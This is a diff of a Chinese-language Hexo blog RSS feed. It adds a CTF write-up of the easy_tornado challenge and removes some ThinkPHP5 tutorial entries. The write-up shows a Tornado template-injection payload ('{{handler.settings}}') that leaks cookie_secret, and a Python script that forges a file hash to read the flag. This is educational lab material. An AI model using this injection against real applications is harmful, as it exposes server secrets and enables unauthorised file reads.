@@ -9,8 +9,61 @@
     <atom:link href="/rss2.html" rel="self" type="application/rss+xml"/>
     
     <description>hello world</description>
-    <pubDate>Fri, 01 May 2020 04:05:28 GMT</pubDate>
+    <pubDate>Wed, 06 May 2020 12:47:24 GMT</pubDate>
     <generator>http://hexo.io/</generator>
+    
+    <item>
+      <title>BUUCTF | [HCTF 2018]admin</title>
+      <link>http://yoursite.com/undefined/[HCTF%202018]admin/</link>
+      <guid>http://yoursite.com/undefined/[HCTF%202018]admin/</guid>
+      <pubDate>Wed, 06 May 2020 12:56:40 GMT</pubDate>
+      <description>
+      
+        
+        
+          &lt;h1 id=&quot;BUUCTF-HCTF-2018-admin&quot;&gt;&lt;a href=&quot;#BUUCTF-HCTF-2018-admin&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF | [HCTF 2018]admin&quot;&gt;&lt;/a&gt;&lt;center&gt;BUUCTF | 
+        
+      
+      </description>
+      
+      
+      <content:encoded><![CDATA[<h1 id="BUUCTF-HCTF-2018-admin"><a href="#BUUCTF-HCTF-2018-admin" class="headerlink" title="BUUCTF | [HCTF 2018]admin"></a><center>BUUCTF | [HCTF 2018]admin</center></h1>]]></content:encoded>
+      
+      <comments>http://yoursite.com/undefined/[HCTF%202018]admin/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>dockerfile创建数据卷</title>
+      <link>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</link>
+      <guid>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/</guid>
+      <pubDate>Wed, 06 May 2020 10:45:37 GMT</pubDate>
+      <description>
+      
+      </description>
+      
+      
+      <comments>http://yoursite.com/undefined/2019%E5%BC%BA%E7%BD%91%E6%9D%AF&#39;&#39;%E9%9A%8F%E4%BE%BF%E6%B3%A8&#39;&#39;/#disqus_thread</comments>
+    </item>
+    
+    <item>
+      <title>2018护网杯(WEB)easy_tornado(模板注入)</title>
+      <link>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</link>
+      <guid>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/</guid>
+      <pubDate>Wed, 06 May 2020 10:45:37 GMT</pubDate>
+      <description>
+      
+        
+        
+          &lt;h1 id=&quot;考察知识点：模板注入&quot;&gt;&lt;a href=&quot;#考察知识点：模板注入&quot; class=&quot;headerlink&quot; title=&quot;考察知识点：模板注入&quot;&gt;&lt;/a&gt;&lt;center&gt;考察知识点：模板注入&lt;/center&gt;&lt;/h1&gt;&lt;p&gt;打开页面发现三个链接依次打开，发现各自的文
+        
+      
+      </description>
+      
+      
+      <content:encoded><![CDATA[<h1 id="考察知识点：模板注入"><a href="#考察知识点：模板注入" class="headerlink" title="考察知识点：模板注入"></a><center>考察知识点：模板注入</center></h1><p>打开页面发现三个链接依次打开，发现各自的文本<br><img src="https://i.imgur.com/zsu1I4d.png" alt="1"></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LISP"><figure class="iseeu highlight /lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flag in /fllllllllllllag</span><br><span class="line">render</span><br><span class="line">md5(<span class="name">cookie_secret+md5</span>(<span class="name">filename</span>))</span><br></pre></td></tr></table></figure></div><p>从上面三个信息得知flag在/fllllllllllllag文件中<br>render这个卡住了看了WP 说render是模板注入<br>第三个文件说了文件名的哈希方法     </p><p>render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LESS"><figure class="iseeu highlight /less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">Tornado</span>是一种 <span class="selector-tag">Web</span> 服务器软件的开源版本。<span class="selector-tag">Tornado</span> 和现在的主流 <span class="selector-tag">Web</span> 服务器框架</span><br><span class="line">(包括大多数 Python 的框架)有着明显的区别：它是非阻塞式服务器，而且速度相当快。</span><br></pre></td></tr></table></figure></div><p>然后就是这段代码md5(cookie_secret+md5(filename)) 根据之前打开文件的url参数分析这个就是filehash的值 想获得flag只要我们在url中传入/fllllllllllllag文件和filehash 经过这段代码处理的值即可关键就在这cookie_secret这块 我们得想办法获得cookie_secret    </p><p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler 指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p><p>通过模板注入方式我们可以构造</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SUBUNIT"><figure class="iseeu highlight /subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://de289baa-da8f<span class="string">-4380</span><span class="string">-954</span>c<span class="string">-4</span>b9c90a1ba95.node3.buuoj.cn/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br><span class="line">//得到'cookie_secret': 'bf0b29ee<span class="string">-5520</span><span class="string">-4</span>b5b-a8a6-ffd19aa464f9'&#125;</span><br></pre></td></tr></table></figure></div><p><img src="https://i.imgur.com/FNG9lhZ.png" alt="2"><br>得到secret后，就是计算访问flag文件的hash，获取flag</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line"></span><br><span class="line">filename=<span class="string">'/fllllllllllllag'</span></span><br><span class="line">cookie_secret="bf0b29ee-5520-4b5b-a8a6-ffd19aa464f9"</span><br><span class="line">hash.<span class="keyword">update</span>(filename.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">s1=hash.hexdigest()</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.<span class="keyword">update</span>((cookie_secret+s1).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">print(hash.hexdigest())</span><br><span class="line">//hashlib.md5（）#获取一个md5加密算法对象</span><br><span class="line">//.hexdigest()返回摘要，作为十六进制数据字符串值</span><br><span class="line">//python3跟python2区别：python3下字符串为Unicode类型，而hash传递时需要的是utf<span class="number">-8</span>类型，因此，需要类型转换</span><br></pre></td></tr></table></figure></div><p>然后得到flag<br><img src="https://i.imgur.com/rJiBStL.png" alt=""></p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;<span class="number">04</span>c40e94<span class="number">-4087</span><span class="number">-49e3</span><span class="number">-85</span>c6<span class="number">-74</span>a9472025c0&#125;</span><br></pre></td></tr></table></figure></div>]]></content:encoded>
+      
+      <comments>http://yoursite.com/undefined/2018%E6%8A%A4%E7%BD%91%E6%9D%AF(WEB)easy_tornado(%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5)/#disqus_thread</comments>
+    </item>
     
     <item>
       <title>Hello Zy</title>
@@ -51,66 +104,6 @@
       <content:encoded><![CDATA[<h1 id="一丶模型操作之删除数据"><a href="#一丶模型操作之删除数据" class="headerlink" title="一丶模型操作之删除数据"></a><font color=red>一丶模型操作之删除数据</font></h1><h2 id="1丶删除当前模型"><a href="#1丶删除当前模型" class="headerlink" title="1丶删除当前模型"></a><font color=green>1丶删除当前模型</font></h2><p>删除模型数据，可以实例化模型后调用delete方法</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = User::get(<span class="number">1</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;delete();</span><br></pre></td></tr></table></figure></div><h2 id="2丶根据主键删除"><a href="#2丶根据主键删除" class="headerlink" title="2丶根据主键删除"></a><font color=green>2丶根据主键删除</font></h2><p>或者直接调用静态方法   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User::destroy(<span class="number">1</span>)</span><br><span class="line"><span class="comment">//支持删除多个数据</span></span><br><span class="line">User::destroy(<span class="string">'1,2,3'</span>);</span><br><span class="line"><span class="comment">//或者</span></span><br><span class="line">User::destroy([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]);</span><br></pre></td></tr></table></figure></div><h2 id="3丶条件删除"><a href="#3丶条件删除" class="headerlink" title="3丶条件删除"></a><font color=green>3丶条件删除</font></h2><p>使用数组进行条件删除，例如：</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//删除状态为0的数据</span></span><br><span class="line">User::destroy([<span class="string">'status'</span>=&gt;<span class="number">0</span>]);</span><br></pre></td></tr></table></figure></div><p>或者通过数据库类的查询条件删除</p><pre><code>User::where(&apos;id&apos;,&apos;&gt;&apos;,10)-&gt;delete();</code></pre>]]></content:encoded>
       
       <comments>http://yoursite.com/undefined/11.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E5%88%A0%E9%99%A4%E6%95%B0%E6%8D%AE/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>10.thinkphp5模型操作之查询数据</title>
-      <link>http://yoursite.com/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</link>
-      <guid>http://yoursite.com/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/</guid>
-      <pubDate>Sat, 25 Apr 2020 12:45:53 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;h1 id=&quot;一丶模型操作之查询数据&quot;&gt;&lt;a href=&quot;#一丶模型操作之查询数据&quot; class=&quot;headerlink&quot; title=&quot;一丶模型操作之查询数据&quot;&gt;&lt;/a&gt;&lt;font color=red&gt;一丶模型操作之查询数据&lt;/font&gt;&lt;/h1&gt;&lt;h2 id=&quot;1丶获取单个
-        
-      
-      </description>
-      
-      
-      <content:encoded><![CDATA[<h1 id="一丶模型操作之查询数据"><a href="#一丶模型操作之查询数据" class="headerlink" title="一丶模型操作之查询数据"></a><font color=red>一丶模型操作之查询数据</font></h1><h2 id="1丶获取单个数据"><a href="#1丶获取单个数据" class="headerlink" title="1丶获取单个数据"></a><font color=green>1丶获取单个数据</font></h2><p><img src="https://i.imgur.com/r5MBwFC.png" alt="1"> </p><h2 id="2丶获取多个数据"><a href="#2丶获取多个数据" class="headerlink" title="2丶获取多个数据"></a><font color=green>2丶获取多个数据</font></h2><p><img src="https://i.imgur.com/4wU4rjB.png" alt="1"> </p><h2 id="3丶聚合"><a href="#3丶聚合" class="headerlink" title="3丶聚合"></a><font color=green>3丶聚合</font></h2><p><img src="https://i.imgur.com/0ZWVjMe.png" alt="1"> </p>]]></content:encoded>
-      
-      <comments>http://yoursite.com/undefined/10.thinkphp5%E6%A8%A1%E5%9E%8B%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%9F%A5%E8%AF%A2%E6%95%B0%E6%8D%AE/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>1.thinkphp5开发规范</title>
-      <link>http://yoursite.com/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/</link>
-      <guid>http://yoursite.com/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/</guid>
-      <pubDate>Sat, 25 Apr 2020 12:45:53 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;h1 id=&quot;一丶URL访问&quot;&gt;&lt;a href=&quot;#一丶URL访问&quot; class=&quot;headerlink&quot; title=&quot;一丶URL访问&quot;&gt;&lt;/a&gt;&lt;font color=green&gt;一丶URL访问&lt;/font&gt;&lt;/h1&gt;&lt;h2 id=&quot;命名规范&quot;&gt;&lt;a href=&quot;#命名规范
-        
-      
-      </description>
-      
-      
-      <content:encoded><![CDATA[<h1 id="一丶URL访问"><a href="#一丶URL访问" class="headerlink" title="一丶URL访问"></a><font color=green>一丶URL访问</font></h1><h2 id="命名规范"><a href="#命名规范" class="headerlink" title="命名规范"></a><font color=green>命名规范</font></h2><h3 id="ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范："><a href="#ThinkPHP5-遵循-PSR-2-命名规范和-PSR-4-自动加载规范，并且注意如下规范：" class="headerlink" title="ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范："></a>ThinkPHP5 遵循 PSR-2 命名规范和 PSR-4 自动加载规范，并且注意如下规范：</h3><h3 id="目录和文件"><a href="#目录和文件" class="headerlink" title="目录和文件"></a><font color=red>目录和文件</font></h3><ul><li>目录使用小写+下划线；  </li><li>类库、 函数文件统一以 .php 为后缀；   </li><li>类的文件名均以命名空间定义，并且命名空间的路径和类库文件所在路径一致；   </li><li>类文件采用驼峰法命名（首字母大写），其它文件采用小写+下划线命名；   </li><li>类名和类文件名保持一致，统一采用驼峰法命名（首字母大写）；   <h3 id="函数和类、-属性命名"><a href="#函数和类、-属性命名" class="headerlink" title="函数和类、 属性命名  "></a><font color=red>函数和类、 属性命名  </font></h3></li><li>类的命名采用驼峰法（首字母大写），例如 User 、 UserType ，默认不需要添加后缀，例如<br>UserController 应该直接命名为 User ；   </li><li>函数的命名使用小写字母和下划线（小写字母开头）的方式，例如 get_client_ip ；   </li><li>方法的命名使用驼峰法（首字母小写），例如 getUserName ；   </li><li>属性的命名使用驼峰法（首字母小写），例如 tableName 、 instance ；   </li><li>以双下划线“__” 打头的函数或方法作为魔术方法，例如 __call 和 __autoload ；   <h3 id="常量和配置"><a href="#常量和配置" class="headerlink" title="常量和配置"></a><font color=red>常量和配置</font></h3></li><li>常量以大写字母和下划线命名，例如 APP_PATH 和 THINK_PATH ；  </li><li>配置参数以小写字母和下划线命名，例如 url_route_on 和 url_convert ；    <h3 id="数据表和字段"><a href="#数据表和字段" class="headerlink" title="数据表和字段 "></a><font color=red>数据表和字段 </font></h3></li><li>数据表和字段采用小写加下划线方式命名，并注意字段名不要以下划线开头，例如 think_user 表和<br>user_name 字段，不建议使用驼峰和中文作为数据表字段命名。   <h3 id="应用类库命名空间规范"><a href="#应用类库命名空间规范" class="headerlink" title="应用类库命名空间规范"></a><font color=red>应用类库命名空间规范</font></h3></li><li>应用类库的根命名空间统一为app（不建议更改，可以设置 app_namespace 配置参数更改， V5.0.8 版本<br>开始使用 APP_NAMESPACE 常量定义）；<br>例如： app\index\controller\Index 和 app\index\model\User 。   </li></ul>]]></content:encoded>
-      
-      <comments>http://yoursite.com/undefined/1.thinkphp5%E5%BC%80%E5%8F%91%E8%A7%84%E8%8C%83/#disqus_thread</comments>
-    </item>
-    
-    <item>
-      <title>12.thinkphp5视图之模板赋值和模板渲染</title>
-      <link>http://yoursite.com/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</link>
-      <guid>http://yoursite.com/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/</guid>
-      <pubDate>Sat, 25 Apr 2020 12:45:53 GMT</pubDate>
-      <description>
-      
-        
-        
-          &lt;h1 id=&quot;一丶视图之模板赋值和模板渲染&quot;&gt;&lt;a href=&quot;#一丶视图之模板赋值和模板渲染&quot; class=&quot;headerlink&quot; title=&quot;一丶视图之模板赋值和模板渲染&quot;&gt;&lt;/a&gt;&lt;font color=red&gt;一丶视图之模板赋值和模板渲染&lt;/font&gt;&lt;/h1&gt;&lt;h
-        
-      
-      </description>
-      
-      
-      <content:encoded><![CDATA[<h1 id="一丶视图之模板赋值和模板渲染"><a href="#一丶视图之模板赋值和模板渲染" class="headerlink" title="一丶视图之模板赋值和模板渲染"></a><font color=red>一丶视图之模板赋值和模板渲染</font></h1><h2 id="首先创建文件夹"><a href="#首先创建文件夹" class="headerlink" title="首先创建文件夹"></a><font color=green>首先创建文件夹</font></h2><p><img src="https://i.imgur.com/lu7oH89.png" alt="1"> </p><h2 id="1丶视图实例化"><a href="#1丶视图实例化" class="headerlink" title="1丶视图实例化"></a><font color=green>1丶视图实例化</font></h2><p>视图由\think\View类配合试图驱动（模板引擎）类一起完成，目前的内置模板引擎包含PHP原生模板和think模板引擎；   </p><p>因为新版的控制器可以无需继承任何的基础类，因此在控制器中如何使用视图决定于你怎么定义控制器。   </p><h2 id="2丶继承-think-Controller类"><a href="#2丶继承-think-Controller类" class="headerlink" title="2丶继承\think\Controller类"></a><font color=green>2丶继承\think\Controller类</font></h2><p>如果你的控制器继承了\think\Controller类的话，则无需自己实例化视图类，可以直接调用控制器基础类封装的相关视图类的方法。<br>|下面的方法可以直接被调用|方法|<br>|  —- | —- |<br>|fetch|渲染模板输出|<br>|display|渲染内容输出|<br>|assign|模板变量赋值|<br>|engine|初始化模板引擎|</p><h2 id="3丶模板赋值"><a href="#3丶模板赋值" class="headerlink" title="3丶模板赋值"></a><font color=green>3丶模板赋值</font></h2><p>除了系统变量和配置参数输出无需赋值外，其他变量如果需要在模板中输出必须首先进行模板赋值操作，绑定数据到模板输出有以下方式：   </p><h2 id="assign方法"><a href="#assign方法" class="headerlink" title="assign方法"></a><font color=green>assign方法</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">namespace index \appcontroller； </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">\think\Controller</span> </span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">function</span> <span class="title">index（）</span></span></span><br><span class="line"><span class="class"><span class="title">/模板变量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$name</span> <span class="title">=ThinkPHP：</span></span></span><br><span class="line"><span class="class"><span class="title">$eamil</span> <span class="title">=thinkphp@qq</span>.<span class="title">comi</span> </span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>'<span class="title">name</span>'<span class="title">，</span> <span class="title">$name</span> <span class="title">）</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（‘email’</span>,<span class="title">$email）</span></span></span><br><span class="line"><span class="class"><span class="title">//或者批量赋值</span></span></span><br><span class="line"><span class="class"><span class="title">$this-&gt;assign（</span>[</span></span><br><span class="line"><span class="class">        ‘name’ =&gt; $name </span></span><br><span class="line"><span class="class">          'email'=&gt;$email</span></span><br><span class="line"><span class="class">//模板输出</span></span><br><span class="line"><span class="class">return $this-&gt;fetch（'index'）；</span></span><br><span class="line"><span class="class">&#125;</span></span><br></pre></td></tr></table></figure></div><h2 id="4丶模板渲染"><a href="#4丶模板渲染" class="headerlink" title="4丶模板渲染"></a><font color=green>4丶模板渲染</font></h2><p>模板渲染最常用的是使用\think\View类的fetch方法，调用格式：   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">fetch</span><span class="params">(<span class="string">'[模板文件]'</span>,[<span class="string">'模板变量（数组）'</span>])</span></span></span><br></pre></td></tr></table></figure></div><p>模板文件的写法支持下面几种：<br>|用法|描述|<br>|——|————-|<br>|不带任何参数|自动定位当前操作的模板文件|<br>|模块[操作]|常用写法，支持跨模块|<br>|完整的模板文件名|直接使用完整的模板文件名(包括模板)|<br>下面是一个最典型的用法，不带任何参数：   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//不带任何参数，自动定位当前操作的模板文件</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch();</span><br></pre></td></tr></table></figure></div><p>表示系统会按照默认规则自动定位模板文件，其规则是：   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">当前模块/默认视图目录/当前控制器<span class="comment">(小写)</span>/当前操作<span class="comment">(小写)</span>.html;</span><br></pre></td></tr></table></figure></div><p>可以在fetch方法里面去写对应的模板名，他会去当前控制器下面去找对应的模板文件；</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//指定模板输出</span></span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'edit'</span>);</span><br></pre></td></tr></table></figure></div><p>另外fetch方法支持跨模块的操作</p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="KOTLIN"><figure class="iseeu highlight /kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">表示调用user控制器下面的user模板。</span><br><span class="line"><span class="keyword">return</span> $<span class="keyword">this</span>-&gt;fetch(<span class="string">'user/user'</span>);</span><br></pre></td></tr></table></figure></div><h3 id="调用方法："><a href="#调用方法：" class="headerlink" title="调用方法："></a>调用方法：</h3><p><img src="https://i.imgur.com/aKOSRYQ.png" alt="1"> </p><h2 id="5丶传入参数方法"><a href="#5丶传入参数方法" class="headerlink" title="5丶传入参数方法"></a><font color=green>5丶传入参数方法</font></h2><p>方法fetch可以传入模板变量，例如：   </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SCALA"><figure class="iseeu highlight /scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">namespace app\index\controller;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">think\Controller</span> </span>&#123;</span><br><span class="line">        public function index()</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> sthis-&gt;fetch(<span class="symbol">'inde</span>x'[</span><br><span class="line">                <span class="symbol">'nam</span>e'=&gt;<span class="symbol">'Think</span> <span class="type">PHP</span>', <span class="symbol">'emai</span>l'=&gt;<span class="symbol">'thinkphp</span><span class="meta">@qq</span>.com'</span><br><span class="line">            ]);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="6丶助手函数"><a href="#6丶助手函数" class="headerlink" title="6丶助手函数"></a><font color=green>6丶助手函数</font></h2><p>如果使用view助手函数渲染输出的话，可以使用下面的方法进行模板变量赋值：  </p><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> view(<span class="string">'index'</span>,[</span><br><span class="line">    <span class="string">'name'</span>=&gt;<span class="string">'thinkphp'</span>,</span><br><span class="line">    <span class="string">'email'</span>=&gt;<span class="string">'thinkphp<span class="subst">$qq</span>.com'</span></span><br><span class="line">]);</span><br></pre></td></tr></table></figure></div>]]></content:encoded>
-      
-      <comments>http://yoursite.com/undefined/12.thinkphp5%E8%A7%86%E5%9B%BE%E4%B9%8B%E6%A8%A1%E6%9D%BF%E8%B5%8B%E5%80%BC%E5%92%8C%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93/#disqus_thread</comments>
     </item>
     
   </channel>
